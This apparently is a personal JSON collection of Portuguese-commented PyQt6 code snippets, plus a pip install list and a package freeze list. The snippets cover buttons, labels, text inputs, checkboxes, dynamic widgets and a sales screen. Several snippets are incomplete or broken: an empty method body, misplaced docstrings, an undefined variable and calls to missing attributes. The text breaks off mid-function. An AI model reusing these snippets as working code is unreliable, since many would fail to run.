{"janela basica - abertura de janela": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import QWidget, QApplication\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300)\t#Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "QPushButton - botao": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import QWidget, QApplication, QPushButton\nfrom PyQt6.QtGui import QFont, QKeySequence, QShortcut, QIcon\nfrom PyQt6.QtCore import Qt, QSize\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Botao')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Usamos o self nesse caso pois n\u00e3o estamos\n\t\tusando o gerenciador de layout, posicionando \n\t\tdessa forma widget por widget'''\n\t\t'''Self.botao para poder editar o botao em \n\t\toutros metodos'''\n\t\t'''Fazendo o estilo do botao'''\n\t\t\n\t#\testilo = \"\"\"\n\t\t#\tQPushButton { background-color: #6495ED; \n\t\t#\tcolor: black; \n\t\t#\tborder-radius: 10px; \n\t\t#\tborder: none;}\n            \n\t\t#QPushButton:pressed {background-color: #87CEFA;}\n\t#\t\"\"\"\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\tbotao = QPushButton(self)\n\t\t#botao.setText('Nome botao')#Seta o texto no botao\n\t\tbotao.setFont(QFont('Arial', 12))\n\t\tbotao.resize(130 , 50)# (x,y)\n\t\t#botao.setMaximumWidth(100) #Comprimento maximo\n\t\t#botao.setMaximumHeight(300) #Altura maxima\n\t\tbotao.setEnabled(True) #Botao ativo ou n\u00e3o\n\t\tbotao.move(20,20)\n\t\t\n\t\ticon = QIcon('dinheiro.png')\n\t\tbotao.setIcon(icon)\n\t\tbotao.setIconSize(QSize(40,40))\n\t\t\n\t\t#botao.setStyleSheet(estilo)\t\t\n\t\t#Atalho para o botao = f10 tem que vir antes do clicked.\n\t\tatalho_botao = QShortcut(QKeySequence(Qt.Key.Key_F10), self)\n\t\tatalho_botao.activated.connect(botao.click)\n\t\tbotao.clicked.connect(self.botao)\n\t\n\n\t\t\n\t\t\n\tdef botao(self):\n\t\tprint('botao apertado')\n\n\nif __name__ == '__main__':\n\tstyle_sheet = '''\n\t\tQPushButton{\n\t\t\t\t\tbackground-color: #FFFFFF;\n\t\t\t\t\tcolor: black;\n\t\t\t\t\tborder-radius: 6px;\n\t\t\t\t\tborder: none;\n\t\t}\n\t\tQPushButton:pressed{\n\t\t\t\t\tbackground-color: #C86354;\n\t\t\t\t\tborder-radius: 4px;\n\t\t\t\t\tpadding:10px;\n\t\t\t\t\tcolor: #DFD8D7\n\t\t}\n\t\tQPushButton:hover {\n\t\t\t\t\tbackground-color: #2980b9;\n\t\t}\n\t\t\n\t'''\n\t\t\t\t\t\n\tapp = QApplication(sys.argv)\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n\n\n\n#################################################################\nBOT\u00d5ES EM UM DICION\u00c1RIO PARA MELHORAR A VELOCIADADE DE PROGRAMA\u00c7\u00c3O\n\n\tbuttons = {\n\t\t\t\"Home\": self.on_home_clicked,\n\t\t\t\"Configura\u00e7\u00f5es\": self.on_config_clicked,\n\t\t\t\"Usu\u00e1rios\": self.on_users_clicked,\n\t\t\t\"Logs\": self.on_logs_clicked,\n\t\t\t\"Backup\": self.on_backup_clicked,\n\t\t\t\"Rede\": self.on_network_clicked,\n\t\t\t\"Sistema\": self.on_system_clicked,\n\t\t\t\"Servi\u00e7os\": self.on_services_clicked,\n\t\t\t\"Armazenamento\": self.on_storage_clicked\n\t\t}\n\n\t\tfor btn_text, btn_function in buttons.items():\n\t\t\tbutton = QPushButton(btn_text)\n\t\t\tbutton.setFixedSize(90, 90)\n\t\t\tbutton.clicked.connect(btn_function)  # \t\t\tConectando o clique do bot\u00e3o \u00e0 fun\u00e7\u00e3o espec\u00edfica\n\t\t\tside_layout.addWidget(button)\n\n\n\n\n\n\n\n\nCRIANDO BOTOES AUTOMATICAMENTE E DELETANDO DEPOIS######################\n#####################################################################\n\nimport sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QPushButton, QLineEdit, QVBoxLayout,\nQHBoxLayout)\n\nclass MainWindow(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.initializeUI()\n        \n    def initializeUI(self):\n        self.setMinimumSize(300, 400)\n        self.setWindowTitle('Botoes autom\u00e1ticos')\n        self.setUpMainWindow()\n        self.showMaximized()\n        \n    def setUpMainWindow(self):\n        self.entrada = QLineEdit()\n        self.entrada.setFixedSize(90, 20)\n        \n        btn_confirmar = QPushButton('Confirmar')\n        btn_confirmar.setFixedSize(90, 20)\n        btn_confirmar.clicked.connect(self.botao_clicado)\n        \n        self.main_layout = QVBoxLayout()\n        self.main_layout.addWidget(self.entrada)\n        self.main_layout.addWidget(btn_confirmar)\n        self.main_layout.addStretch(1) '''Sem o n\u00famero n\u00e3o empurra todo mundo'''\n        self.setLayout(self.main_layout)\n        \n    def botao_clicado(self):\n        '''O lambda serve para que possamos passar o arqumento ao chamar a fun\u00e7\u00e3o\n        quando clicar no bot\u00e3(self, botao), dessa forma podemos deletar o bot\u00e3o\n        correto.\n\t\t\to self.main_layout.count(), retorna quantos widgets tem no layout\n\t\tincluindo o stretch(1) e insere o Widget no layout com 1 lugar a menos \n\t\tque o \u00faltimo, o novo_botao \u00e9 o objeto rec\u00e9m criado que ser\u00e1 inserido\n\t\tno layout.\n\t\t\tO botao.deleteLater() envia o objeto do QPushButton como argumento \n\t\t\tda fun\u00e7\u00e3o a fun\u00e7\u00e3o deleta o bot\u00e3o selecionado.\n        '''        \n        # Capturamos o nome que ter\u00e1 o novo bot\u00e3o\n        nome_botao = self.entrada.text()\n        \n        # Configuramos o novo bot\u00e3o com o nome capturado\n        novo_botao = QPushButton(nome_botao)\n        novo_botao.setFixedSize(90, 20)\n        novo_botao.clicked.connect(lambda: self.novo_botao_clicado(novo_botao))\n\n        self.main_layout.insertWidget(self.main_layout.count() - 1, novo_botao)\n        \n        \n    def novo_botao_clicado(self, botao):\n        botao.deleteLater()\n        \nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = MainWindow()\n    sys.exit(app.exec())\n\n\n\n#CRIANDO BOTOES DINAMICOS, CLICA E ADICIONA NOVOS WIDGET E DELETA#########\n#####################################################################\nimport sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QPushButton, QLineEdit, QLabel,\nQVBoxLayout, QHBoxLayout)\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('Bot\u00f5es autom\u00e1ticos')\n\t\tself.setUpMainWindow()\n\t\tself.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tself.entrada = QLineEdit()\n\t\tself.entrada.setFixedSize(90, 20)\n\t\t\n\t\tbtn_confirmar = QPushButton('Confirmar')\n\t\tbtn_confirmar.setFixedSize(90, 20)\n\t\tbtn_confirmar.clicked.connect(self.botao_clicado)\n\t\t\n\t\t\n\t\tself.main_layout = QVBoxLayout()\n\t\tself.main_layout.addWidget(self.entrada)\n\t\tself.main_layout.addWidget(btn_confirmar)\n\t\tself.main_layout.addStretch(1)\n\t\tself.setLayout(self.main_layout)\n\t\t\n\t\t\n\t\tself.widget_dict = {}\n\t\t\n\tdef botao_clicado(self):\n\t\tnome_botao = self.entrada.text()\n\t\t\n\t\tlabel = QLabel(nome_botao)\n\t\t\n\t\tline_edit = QLineEdit(nome_botao)\n\t\tline_edit.setFixedSize(90, 20)\n\t\t\n\t\tline_edit2 = QLineEdit(nome_botao)\n\t\tline_edit2.setFixedSize(90, 20)\n\t\t\n\t\t#Configuramos o novo bot\u00e3o com o nome capturado\n\t\tnovo_botao = QPushButton(nome_botao)\n\t\tnovo_botao.setFixedSize(90, 20)\n\t\tnovo_botao.clicked.connect(lambda: self.novo_botao_clicado(novo_botao))\n\t\t\n\t\tlinha = QHBoxLayout()\n\t\tlinha.addWidget(label)\n\t\tlinha.addWidget(line_edit)\n\t\tlinha.addWidget(line_edit2)\n\t\tlinha.addWidget(novo_botao)\n\t\tself.main_layout.insertLayout(self.main_layout.count() - 1, linha)\n\t\t\n\t\tself.widget_dict[novo_botao] = (label, line_edit, line_edit2, linha)\n\t\t\n\tdef novo_botao_clicado(self, botao_objeto):\n\t\t'''Recupera os valores que est\u00e3o no dicion\u00e1rio indexados ao objeto botao\n\t\texplui o objeto do bot\u00e3o e enche as vari\u00e1veis com os respectivos\n\t\tvalores setados pela ordem, n\u00e3o pelo nome!!![\n\t\t\n\t\t\tEm seguida remove os widgets do layout que elas est\u00e3o setadas\n\t\te depois deleta os widgets do layout principal. \u00c9 uma boa pr\u00e1tica\n\t\tdeletar os widgets do layout de linha\t\n\t\t'''\n\t\tlabel, line_edit, line_edit2, linha = self.widget_dict.pop(botao_objeto)\n\t\t\n\n\t\t#Remover os widget do layout\n\t\tlinha.removeWidget(label)\n\t\tlinha.removeWidget(line_edit)\n\t\tlinha.removeWidget(line_edit2)\n\t\tlinha.removeWidget(botao_objeto)\n\t\t\n\t\t#Deletar os widget\n\t\tlabel.deleteLater()\n\t\tline_edit.deleteLater()\n\t\tline_edit2.deleteLater()\n\t\tbotao_objeto.deleteLater()\n\t\t\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n\nQPUHSBUTTON + QSCROLLAREA()  - PAGINA DE VENDAS ##########################\n#####################################################################\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel, QLineEdit, QPushButton,\nQComboBox, QScrollArea, QVBoxLayout, QHBoxLayout)\nimport sys\nimport json\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\t'''\n\t\t Estamos carregando o estoque e setando o combobox j\u00e1 na \n\t\t inicializa\u00e7\u00e3o do sistema\n\t\t'''\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('P\u00e1gina Din\u00e3mica de Vendas')\n\t\tself.itens_selecionado_venda = {}\n\t\tself.estoque = {}\n\t\tself.carregar_estoque()\n\t\tself.setUpMainWindow()\n\t\tself.info_item_combo()\n\t\tself.showMaximized()\n\t\t\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''\n\t\tPrimeiro criamos os Widgets, criamos tamb\u00e9m o objeto self.scroll_area que vai receber\n\t\te evidenciar para o usu\u00e1rio os itens selecionados para a venda.\n\t\tDepois fazemos o layout do cabe\u00e7alho com o HBoxLayout(), em seguinda colocamos\n\t\tesse layout no main_layout que \u00e9 o layout geral da p\u00e1gina.\n\t\t\n\t\t'''\n\t\tself.combo_box = QComboBox()\n\t\tself.combo_box.setFixedSize(350, 30)\n\t\tself.combo_box.addItems(list(self.estoque.keys()))\n\t\tself.combo_box.currentTextChanged.connect(self.info_item_combo)\n\t\t\n\t\tself.quantidade_label = QLabel('Quantidade')\n\t\t\n\t\tself.quantidade_venda_edit = QLineEdit('1')\n\t\tself.quantidade_venda_edit.setFixedSize(60, 30)\n\t\t\n\t\tself.preco_label = QLabel('Pre\u00e7o: R$ ---')\n\t\t\n\t\tself.botao_lancar = QPushButton('Lan\u00e7ar')\n\t\tself.botao_lancar.setFixedSize(50, 30)\n\t\tself.botao_lancar.clicked.connect(self.set_scroll_area)\n\t\t\n\t\t\n\t\t\n\t\t\n\t\tself.scroll_area = QScrollArea()\n\t\tself.scroll_area.setWidgetResizable(True)\n\n\t\t\n\t\t\n\t\t\n\t\t\n\t\tself.cabecalho = QHBoxLayout()\n\t\tself.cabecalho.addWidget(self.combo_box)\n\t\tself.cabecalho.addSpacing(30)\n\t\tself.cabecalho.addWidget(self.quantidade_label)\n\t\tself.cabecalho.addWidget(self.quantidade_venda_edit)\n\t\tself.cabecalho.addSpacing(60)\n\t\tself.cabecalho.addWidget(self.preco_label)\n\t\tself.cabecalho.addWidget(self.botao_lancar)\n\t\t\n\t\tself.main_window = QVBoxLayout()\n\t\tself.main_window.addLayout(self.cabecalho)\n\t\tself.main_window.addWidget(self.scroll_area)\n\t\tself.setLayout(self.main_window)\n\t\t\n\t\n\t\n\tdef info_item_combo(self):\n\t\t'''Setamos os widget de info so produto '''\n\t\titem = self.combo_box.currentText()\n\t\tquantidade = self.estoque[item]['quantidade']\n\t\tpreco = self.estoque[item]['valor']\n\t\t\n\t\tself.quantidade_label.setText(f'Quantidade: {quantidade} und. disp.')\n\t\tself.preco_label.setText(f'Pre\u00e7o: R$: {preco}')\n\t\n\tdef set_scroll_area(self):\n\t\t'''\n\t\t\tCriamos os objetos, o QWidget() \u00e9 criado aqui, pois assim, quando\n\t\ta fun\u00e7\u00e3o for chamada, ele vir\u00e1 virgem, o objeto dolayout que ser\u00e1 \n\t\tconfigurado dentro da ScrollArea \u00e9 criado aqui, para que toda vez\n\t\tque a fun\u00e7\u00e3o for chamada o objeto ser criado novamente e n\u00e3o repetir as\n\t\tinforma\u00e7\u00f5es dentro do ScrollArea, tipo quando o ComboBox n\u00e3o \u00e9 apagado \n\t\tantes de novas informa\u00e7\u00f5es.\n\t\t\tO addStrtch(1) serve para empurrar todo mundo do layout para as \n\t\tprimeira posi\u00e7\u00f5es.\n\t\t'''\n\t\tself.widget_scroll = QWidget() #Quadrado onde o layout vai.\n\t\tself.scroll_layout = QVBoxLayout()\n\t\tself.scroll_layout.addStretch(1)\t\t\n\t\t\n\t\t\n\t\t'''\n\t\t\tAqui estamos contruindo o dicion\u00e1rio ter\u00e1 os itens e as suas \n\t\trespectivar informa\u00e7\u00f5es de venda que foram selecionados\n\t\t\n\t\t\n\t\t\n\t\t'''\n\t\tinfo = {}\n\t\titem = self.combo_box.currentText()\n\t\tquantidade = self.quantidade_venda_edit.text()\n\t\tvalor = self.estoque[item]['valor']\n\t\t\n\t\tinfo['quantidade'] = float(quantidade)\n\t\tinfo['valor'] = float(valor)\n\t\t\n\t\tself.itens_selecionado_venda[item] = info \n\t\t\n\n\t\t'''\n\t\t\tAtrav\u00e9s do la\u00e7o do dicion\u00e1rio, ser\u00e1 criado um layout para cada\n\t\tlinha com o QHBoxLayout() (linha), depois da linha criada, a linha\n\t\t\u00e9 adicionada no layout que vai para dentro da ScrollArea, deve\n\t\testar dentro do la\u00e7o, pois assim, cada linha criada \u00e9 adicionada.\n\t\t\tEm seguida, finalizamos o layout que vai para dentro da \n\t\tScrollArea(), quadrado.setLayout(self.scroll_alyout).\n\t\t\tEm seguida, colocamos o Widget() com o layout j\u00e1 embutido\n\t\tna ScrollArea, nome_objeto.setWidget(quadrado)\n\t\t\n\t\t'''\n\t\t'''\n\t\t\tFazemos o dicion\u00e1rio self.widgets_dict, ele vai carregar o objeto\n\t\tdo bot\u00e3o em chave e os outros widgets da linha que queremos deletar\n\t\ttodos juntos em uma tupla, isso serve para que possamos recuperar\n\t\tos widgets que queremos deletar do layout depois.\n\t\t\n\t\t'''\n\t\t\n\t\tself.widgets_dict = {}\n\t\tfor item, info in self.itens_selecionado_venda.items():\n\t\t\tself.item_label_v = QLabel(item)\n\t\t\tself.quantidade_label_v = QLabel(str(info['quantidade']))\n\t\t\tself.valor_label_v = QLabel(str(info['valor']))\n\t\t\tself.botao_excluir_v = QPushButton(f'x{numero}')\n\t\t\tself.botao_excluir_v.clicked.connect(lambda _, b=self.botao_excluir_v: self.deletar(b))\n\t\t\t'''\n\t\t\t\tO lambda serve para chamar uma fun\u00e7\u00e3o com um arquimento espec\u00edfico,\n\t\t\to _ serve para informar que ser\u00e1 capturado uma argumento impl\u00edcito \n\t\t\tna cria\u00e7\u00e3o da lambda, o argumento nesse caso \u00e9 o objeto do bot\u00e3o \n\t\t\tque acabou de ser criado e quando a fun\u00e7\u00e3o self.deletar() for chamada\n\t\t\tter\u00e1 como argumento o 'b' que \u00e9 o objeto do botoa,\n\t\t\tsem isso, o argumento passado seria sempre o \u00faltimo criado,\n\t\t\tent\u00e3o a lambda \u00e9 armazenada em algum lugar. \n\t\t\t\tO _ n\u00e3o \u00e9 usado na fun\u00e7\u00e3o, ou seja uma conven\u00e7\u00e3o comum para\n\t\t\tindicar uma vari\u00e1vel n\u00e3o utilizada, mas necess\u00e1rio para capturar\n\t\t\to arqumento impl\u00edcito.\n\t\t\t\t\n\t\t\t'''\n\t\t\t\n\t\t\t\n\t\t\t'''Fazendo o layout 'linha' com os widgets'''\n\t\t\tlinha = QHBoxLayout()\n\t\t\tlinha.addWidget(self.item_label_v)\n\t\t\tlinha.addWidget(self.quantidade_label_v)\n\t\t\tlinha.addWidget(self.valor_label_v)\n\t\t\tlinha.addWidget(self.botao_excluir_v)\n\t\t\t\n\t\t\tself.scroll_layout.insertLayout(self.scroll_layout.count() -1, linha)\n\t\t\t'''Conta quantos widgets tem e aloca o layout 'linha' uma linha\n\t\t\tantes do stratch, empurrando todos os widgets criados para cima \n\t\t\tdentro da ScrollArea\n\t\t\t'''\n\t\t\t\n\t\t\tself.widgets_dict[self.botao_excluir_v] = (self.item_label_v,\n\t\t\tself.quantidade_label_v,\n\t\t\tself.valor_label_v,\n\t\t\titem,\n\t\t\tlinha)\n\t\t\t\n\t\tself.widget_scroll.setLayout(self.scroll_layout)\n\t\t\n\n\t\tself.scroll_area.setWidget(self.widget_scroll)\n\n\tdef deletar(self, botaoO):\n\t\t'''\n\t\t\tRecuperamos os valores dentro da tupla do dicion\u00e1rio j\u00e1 \n\t\texcluindo do dicino\u00e1rio os widgets [chave]:(tupla).\n\t\t\tEm seguida removemos os widgets do layout 'linha', pois \n\t\tdessa forma liberamos recursos, funcionaria igulamente sem \n\t\tmas \u00e9 uma boa pr\u00e1tica remover.\n\t\t\tLogo depois, deletamos os widgets permanentemente do \n\t\tda p\u00e1gina.\n\t\t\tDeletamos o item do dicion\u00e1rio self.itens_selecionado_venda\n\t\t'''\n\t\t#Recuperar os widgets\n\t\titemO, qntO, valorO, itemT, linhaO = self.widgets_dict.pop(botaoO)\n\t\t#print(itemT)\n\t\t#Remover os widgets do layout 'linha\n\t\tlinhaO.removeWidget(itemO)\n\t\tlinhaO.removeWidget(qntO)\n\t\tlinhaO.removeWidget(valorO)\n\t\tlinhaO.removeWidget(botaoO)\n\t\t\n\t\titemO.deleteLater()\n\t\tqntO.deleteLater()\n\t\tvalorO.deleteLater()\n\t\tbotaoO.deleteLater()\n\t\tdel self.itens_selecionado_venda[itemT]\n\t\t#print(self.itens_selecionado_venda)\n\t\t\n\t\n\tdef carregar_estoque(self):\n\t\ttry:\n\t\t\twith open('estoque.json', 'r') as file:\n\t\t\t\tcontent = file.read()\n\t\t\t\tif content:\n\t\t\t\t\tself.estoque.update(json.loads(content))\n\t\t\t\t\t\n\t\texcept (FileNotFoundError, json.JSONDecodeError):\n\t\t\tpass\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\t\t\n\t\t\n\t\t\n\n\t\t\n\t\t\n\t\t\n\n"}, "pip install - bibliotecas": {"categoria": "Bibliotecas", "codigo": "pip install PyQt6 #Interface\npip install pyttsx3 #Leitura de voz\npip install openpyxl xlrd #Planilhas xls ou xlsx\npip install pyaudio #Capturar a fala do microfone\npip install SpeechRecognition #Reconhecimento de fala\npip install pocketsphinx #Reconhecimento de fala offline\npip install playsound #Reproduz som abrindo o arquivo\npip install registration #Para fazer janelas de login\n\n\n\n\n\n\naltgraph                  0.17.4\nbuildozer                 1.5.0\ncertifi                   2023.11.17\ncharset-normalizer        3.3.2\ncomtypes                  1.3.1\ncontourpy                 1.2.0\ncycler                    0.12.1\nDateTime                  5.4\ndistlib                   0.3.8\ndocutils                  0.20.1\net-xmlfile                1.1.0\nfilelock                  3.13.1\nfonttools                 4.47.2\ngeographiclib             2.0\ngeopy                     2.4.1\nidna                      3.6\nKivy                      2.3.0\nkivy-deps.angle           0.4.0\nkivy-deps.glew            0.3.1\nkivy-deps.sdl2            0.7.0\nKivy-Garden               0.1.5\nkiwisolver                1.4.5\nmatplotlib                3.8.2\nmemory-profiler           0.61.0\nnumpy                     1.26.3\nopenpyxl                  3.1.2\npackaging                 23.2\npandas                    2.2.1\npefile                    2023.2.7\npexpect                   4.9.0\npillow                    10.2.0\npip                       24.0\nplatformdirs              4.1.0\npsutil                    5.9.8\nptyprocess                0.7.0\nPyAudio                   0.2.14\nPygments                  2.17.2\npyinstaller               6.3.0\npyinstaller-hooks-contrib 2024.0\npyparsing                 3.1.1\npypiwin32                 223\nPyQt6                     6.6.1\nPyQt6-Qt6                 6.6.1\nPyQt6-sip                 13.6.0\npython-dateutil           2.8.2\npytz                      2023.3.post1\npywifi                    1.1.12\npywin32                   306\npywin32-ctypes            0.2.2\nrequests                  2.31.0\nscapy                     2.5.0\nsetuptools                69.0.3\nsh                        2.0.6\nsix                       1.16.0\nSpeechRecognition         3.10.1\ntimer                     0.2.2\ntyping_extensions         4.10.0\ntzdata                    2024.1\nUnidecode                 1.3.8\nurllib3                   2.1.0\nvirtualenv                20.25.0\nxlrd                      2.0.1\nzope.interface            6.1\npsycopg2"}, "QLabel - texto widget": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import QWidget, QApplication, QLabel\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Usamos o self nesse caso pois n\u00e3o estamos\n\t\tusando o gerenciador de layout, posicionando \n\t\tdessa forma widget por widget'''\n\t\t'''Self.texto para poder editar o botao em \n\t\toutros metodos'''\n\t\t\n\t\ttexto = QLabel('Textoooooooooooooo0000000000000000000', self)\n\t\t#texto.setText('Textoooooooooooooo')\n\t\ttexto.setFont(QFont('Arial', 10))\n\t\ttexto.adjustSize() #Ajuda o tamanho do QLabel\n\t\ttexto.move(20, 20)\n\t\t#Trocando a cor do texto\n\t\ttexto.setStyleSheet('color: red; background-color: yellow;')\n\t\t\n\n\nif __name__  == '__main__':\n\tstyle_sheet ='''\n\tQLabel{\n\t\t\tbackground-color: #EFD096;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 4px;\n\t\t\tborder-color: #EFD096\n\t}\n\t'''\n\t\n\tapp = QApplication(sys.argv)\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\t"}, "QLineEdit - entrada teclado": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import QWidget, QApplication, QLineEdit\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Usamos o self nesse caso pois n\u00e3o estamos\n\t\tusando o gerenciador de layout, posicionando \n\t\tdessa forma widget por widget'''\n\t\t'''QLineEdit sempre usa self.'''\n\t\t\n\t\tself.entrada = QLineEdit('texto v\u00e1lido', self)\n\t\t#self.entrada.setText('texto desejado')\n\t\t#self.entrada.setPlaceholderText('Texto informativo')\n\t\t#self.entrada.resize(200, 20) #(x , y)\n\t\tself.entrada.setInputMask('(999) 999-9999;_')\n\t\tself.entrada.setMaximumWidth(200)\n\t\tself.entrada.setMaximumHeight(20)\n\t\tself.entrada.setClearButtonEnabled(True)\n\t\t#self.entrada.setEchoMode(QLineEdit.EchoMode.Password)\n\t\t#self.entrada.setEchomode(QLineEdit.EchoMode.Normal)\n\t\tself.entrada.setStyleSheet('''background-color: #EED4A4;\n\t\tborder-radius: 10px; border: 2px solid gray;''')\n\t\tself.move(10, 10)\n\t\t#self.textEdited.connect(self.nomedometodo)\n\t\t'''A cada vez que algo for teclado a fun\u00e7\u00e3o escolhida\n\t\tser\u00e1 chamada'''\n\n\t#Aceita apenas n\u00fameros e '.' para n\u00e3o gerar erros em calculos\n\tdef apenas_num_pont(self):\n\t\tfor char in self.entrada.text():\n\t\t\tif not char.isdigit() and char != '.':\n\t\t\t\tself.entrada.clear()\n\t\t\telse:\n\t\t\t\ta=0\n\t\t\n\t\t\n\t\t\n\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "QTextEdit - entrada de texto": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import QWidget, QApplication, QTextEdit\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Usamos o self nesse caso pois n\u00e3o estamos\n\t\tusando o gerenciador de layout, posicionando \n\t\tdessa forma widget por widget'''\n\t\t'''Self. para poder editar o widget em \n\t\toutros metodos'''\n\t\t\n\t\tself.entrada_tedit = QTextEdit('texto desejado', self)\n\t\tself.entrada_tedit.setText('texto desejado')\n\t\t#self.entrada_tedit.setPlaceholderText('Texto informativo')\n\t\tself.entrada_tedit.setFont(QFont('Arial', 10))\n\t\tself.entrada_tedit.resize(200, 300)\n\t\t#self.entrada_tedit.append(oquedeseja) #Acrescenta linha a linha\n\t\t\n\t\t#Cor e bordas arredondadas\n\t\tself.entrada_tedit.setStyleSheet('''background-color: #EED4A4;\n\t\tborder-radius: 10px; border: 2px solid gray;''')\n\t\tself.move(10, 10)\n\t\tself.entrada_tedit.textChanged.connect(self.asdfsad)\n\t\t\n\n\t\ttexto = self.entrada.toPlainText()\n\t\t\n\t\t\n\t\t\n\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())"}, "QCheckBox - caixa para marcar": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLineEdit,\nQCheckBox, QLabel)\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\t#self.setMaximumWidth(300) #Maximo comprimento\n\t\t#self.setMaximumHeigth(300) #Maximo altura\n\t\tself.setWindowTitle('Janela')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t#Self.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t\n\t\tself.entrada_edit = QLineEdit('texto desejado', self)\n\t\tself.entrada_edit.move(20,20)\n\t\t\n\t\tself.texto_label = QLabel(self)\n\t\tself.texto_label.move(20, 100)\n\t\t\n\t\tself.entrada_cb = QCheckBox('texto desejado', self)\n\t\t#self.entrada_cb.toggle() #Abre ja marcado\n\t\tself.entrada_cb.move(20, 60)\n\t\tself.entrada_cb.toggled.connect(self.mostrar)\n\t\t\n\tdef mostrar(self, checked):\n\t\tsinal = self.sender()\n\t\t\n\t\tif checked:\n\t\t\tself.entrada_edit.setEchoMode(QLineEdit.EchoMode.Password)\n\t\t\tself.texto_label.setText(sinal.text())\n\t\t\tself.texto_label.adjustSize()\n\t\t\t\n\t\tif checked == False:\n\t\t\tself.entrada_edit.setEchoMode(QLineEdit.EchoMode.Normal)\n\t\t\tself.texto_label.setText('')\n\t\t\n\t\t\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n\n\n\n###############################################################\n#Verifica a situa\u00e7\u00e3o do QCheckBox, se ele est\u00e1 marcado ou n\u00e3o:\n\n\tdef set_info_combo_preco_sugerido(self, checked):\n\t\titem = self.itens_estoque_combo.currentText()\n\t\tpreco_sugerido_formatado = 0\n\n\t\tif item != '':\n\t\t\tif item in 